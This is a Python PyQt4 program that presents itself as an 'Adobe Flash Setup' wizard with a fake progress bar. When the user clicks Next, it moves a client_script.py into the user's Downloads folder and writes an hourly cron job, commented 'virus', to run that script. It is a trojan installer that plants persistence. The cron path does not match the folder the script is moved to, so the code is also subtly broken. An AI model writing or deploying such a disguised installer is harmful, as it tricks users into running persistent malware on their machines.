import sys
import os
import shutil
from crontab import CronTab
from PyQt4.QtCore import *
from PyQt4.QtGui import *
try:
    _fromUtf8 = QString.fromUtf8
except AttributeError:
    def _fromUtf8(s):
        return s

try:
    _encoding = QApplication.UnicodeUTF8
    def _translate(context, text, disambig):
        return QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
    def _translate(context, text, disambig):
        return QApplication.translate(context, text, disambig)


class stackedExample(QWidget):
    def __init__(self):
        super(stackedExample, self).__init__()


        self.stack1 = QWidget()
        self.stack2 = QWidget()
        self.stack3 = QWidget()

        self.stack1UI()
        self.stack2UI()
        self.stack3UI()

        self.Stack = QStackedWidget(self)
        self.Stack.addWidget(self.stack1)
        self.Stack.addWidget(self.stack2)
        self.Stack.addWidget(self.stack3)

        hbox = QHBoxLayout(self)
        hbox.addWidget(self.Stack)

        self.setLayout(hbox)
        self.setGeometry(300, 50, 401, 301)
        self.setWindowTitle('StackedWidget demo')
        self.display(0)
        self.show()


    def stack1UI(self):

        self.textBrowser_Page1 = QTextBrowser()
        self.textBrowser_Page1.setGeometry(QRect(0, 0, 401, 241))
        self.textBrowser_Page1.setObjectName(_fromUtf8("textBrowser_Page1"))
        self.textBrowser_Page1.setHtml(_translate("InstallerWidget",
                                                  "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
                                                  "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
                                                  "p, li { white-space: pre-wrap; }\n"
                                                  "</style></head><body style=\" font-family:\'Cantarell\'; font-size:11pt; font-weight:400; font-style:normal;\">\n"
                                                  "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:14pt; font-weight:600;\">Welcome to Adobe Flash Setup</span></p>\n"
                                                  "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:14pt; font-weight:600;\">Pro Setup Wizard</span></p>\n"
                                                  "<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p>\n"
                                                  "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:10pt;\">This will install Adobe Flash Version 7.0.1 on your computer.</span></p>\n"
                                                  "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:10pt;\">It is recommended that you close all other applications before continuing.</span></p>\n"
                                                  "<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-size:10pt;\"><br /></p>\n"
                                                  "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:10pt;\">Click Next to continue, or Cancel to exit Setup.</span></p></body></html>",
                                                  None))
        self.page1_b1 = QPushButton("Cancel")
        self.page1_b2 = QPushButton("Next")
        vbox = QVBoxLayout()
        vbox.addWidget(self.textBrowser_Page1)
        hbox = QHBoxLayout()
        hbox.addWidget(self.page1_b1)
        hbox.addSpacing(2)
        hbox.addWidget(self.page1_b2)
        vbox.addLayout(hbox)
        self.page1_b2.clicked.connect(lambda: self.display(1))
        self.page1_b1.clicked.connect(lambda: self.exit())
        self.stack1.setLayout(vbox)


    def stack2UI(self):

        self.textBrowser_Page2_Status = QTextBrowser()
        self.textBrowser_Page2_Status.setGeometry(QRect(20, 70, 351, 111))
        self.textBrowser_Page2_Status.setObjectName(_fromUtf8("textBrowser_Page2_Status"))

        self.label_Page2_1 = QLabel()
        self.label_Page2_1.setGeometry(QRect(50, 20, 211, 21))
        self.label_Page2_1.setObjectName(_fromUtf8("label_Page_1"))
        self.label_Page2_1.setText(_translate("InstallerWidget", "The Updates are being installed", None))


        self.label_Page2_2 = QLabel()
        self.label_Page2_2.setGeometry(QRect(10, 50, 121, 21))
        self.label_Page2_2.setObjectName(_fromUtf8("label_Page2_2"))
        self.label_Page2_2.setText(_translate("InstallerWidget", "Installation status:", None))

        self.label_Page2_3 = QLabel()
        self.label_Page2_3.setGeometry(QRect(20, 200, 64, 21))
        self.label_Page2_3.setObjectName(_fromUtf8("label_Page2_3"))
        self.label_Page2_3.setText(_translate("InstallerWidget", "Installing:", None))

        self.progress = QProgressBar(self)
        self.progress.setGeometry(200, 80, 250, 20)




        self.page2_b1 = QPushButton("Next")
        vbox = QVBoxLayout()
        vbox.addWidget(self.label_Page2_1)
        vbox.addWidget(self.label_Page2_2)
        vbox.addWidget(self.progress)
        vbox.addWidget(self.label_Page2_3)
        vbox.addWidget(self.textBrowser_Page2_Status)
        hbox = QHBoxLayout()
        hbox.addSpacing(250)
        hbox.addWidget(self.page2_b1)
        vbox.addLayout(hbox)
        self.page2_b1.clicked.connect(lambda: self.display(2))
        self.stack2.setLayout(vbox)


    def stack3UI(self):

        self.textBrowser_Finish = QTextBrowser()
        self.textBrowser_Finish.setGeometry(QRect(20, 30, 331, 201))
        self.textBrowser_Finish.setObjectName(_fromUtf8("textBrowser_Finish"))

        self.textBrowser_Finish.setHtml(_translate("InstallerWidget",
                                                   "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
                                                   "<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
                                                   "p, li { white-space: pre-wrap; }\n"
                                                   "</style></head><body style=\" font-family:\'Cantarell\'; font-size:11pt; font-weight:400; font-style:normal;\">\n"
                                                   "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:12pt; font-weight:600;\">Pro Wizard Setup Complete</span></p>\n"
                                                   "<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p>\n"
                                                   "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:10pt;\">The Pro Wizard has sucessfully installed the update.</span></p>\n"
                                                   "<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><span style=\" font-size:10pt;\">Click Finish to exit the wizard.</span></p></body></html>",
                                                   None))

        self.page3_b1 = QPushButton()
        self.page3_b1.setGeometry(QRect(290, 250, 95, 31))
        self.page3_b1.setObjectName(_fromUtf8("pushButton_Finish2"))
        self.page3_b1.setText(_translate("InstallerWidget", "Finish", None))


        vbox = QVBoxLayout()
        vbox.addWidget(self.textBrowser_Finish)

        hbox = QHBoxLayout()
        hbox.addSpacing(250)
        hbox.addWidget(self.page3_b1)

        vbox.addLayout(hbox)
        self.page3_b1.clicked.connect(lambda: self.exit())
        self.stack3.setLayout(vbox)


    def display(self, i):
        self.Stack.setCurrentIndex(i)
        if i == 1:
            self.download()

    def exit(self):
        sys.exit(0)

    def download(self):
        self.persitence_code()
        self.completed = 0

        while self.completed < 300:
            self.completed += 0.0001
            self.progress.setValue(self.completed)



    def persitence_code(self):
        myUser = os.environ["USER"]
        if not os.path.exists("/home/"+myUser+"/Downloads/adobeflash"):
            os.makedirs("/home/"+myUser+"/Downloads/adobeflash")
        shutil.move("client_script.py", "/home/"+myUser+"/Downloads/adobeflash/client_script.py")
        tab = CronTab(user=myUser)
        cmd = 'python /bin/adobeflash/client_script.py'
        cron_job = tab.new(cmd, comment='virus')
        cron_job.hour.every(1)
        tab.write()
        print "done"


def main():
    app = QApplication(sys.argv)
    ex = stackedExample()
    sys.exit(app.exec_())


if __name__ == '__main__':
    main()